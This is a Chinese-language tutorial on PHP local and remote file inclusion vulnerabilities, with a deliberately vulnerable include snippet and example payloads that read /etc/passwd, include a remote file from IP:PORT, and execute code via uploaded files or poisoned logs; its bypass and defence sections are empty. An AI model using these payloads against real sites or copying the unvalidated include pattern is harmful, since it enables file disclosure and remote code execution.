# 文件包含漏洞

## 文件包含漏洞概述

### 文件包含简介

开发者将重复使用的函数写入单个文件, 需要使用某个函数时直接调用该文件, 无需再次编写, 文件调用的过程称为文件包含

### 文件包含分类

* 本地文件包含 LFI (Local File Include)
* 远程文件包含 RFI (Remote File Include)

`allow_url_fopen=On` 允许从远程服务器或网站检索数据

`allow_url_include=On` 允许 `include / require` 远程文件

### php 文件包含函数

`include` 与 `require` 除了错误处理基本相同

* `include()` 在包含过程中出现错误, 生成警告 (E_WARNING), 脚本继续执行
* `require()` 在包含过程中出现错误, 生成致命错误 (E_COMPILE_ERROR), 脚本停止执行
* `include_once()` 与 `require_once()` 特性同上, 不同在于若文件已包含, 则不再包含, 可以避免函数重定义, 变量重新赋值

```php
<?php
function to_print($name){
  echo "{$name} is print this func<hr/>"
}
?>
```

```php
<?php
include('func.php');
to_print('jack');
?>
```

```php
<?php
include('func.php');
to_print('bob');
?>
```

### 文件包含漏洞

开发者为了使代码更灵活, 将被包含的文件设置为变量, 用来进行动态调用, 造成了客户端可以调用恶意文件, 出现了文件包含漏洞.

通过 PHP 函数引入文件时, 传入的文件名未进行合理验证, 执行了预想之外的文件, 最终导致意外的文件泄露甚至恶意代码注入.

```php
<?php
error_reporting(0);
$file = $_GET["file"];
include $file;

highlight_file(__FILE__);
?> 
```

`http://example.com/include.php?file=/etc/passwd`

## 文件包含漏洞利用

### 任意文件读取

`file://` 与直接包含 `?file=file:///etc/passwd`

### 远程文件包含

`?file=http://IP:PORT/phpinfo.php`

### 包含上传文件

文件包含函数会将被包含的文件内容当作PHP代码去解析，那么我可以寻找网站上的上传功能，上传带有恶意代码的图片、文件等等，在通过文件包含函数进行包含。

### 包含日志文件

WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。


## 文件包含漏洞绕过

##  文件包含漏洞防御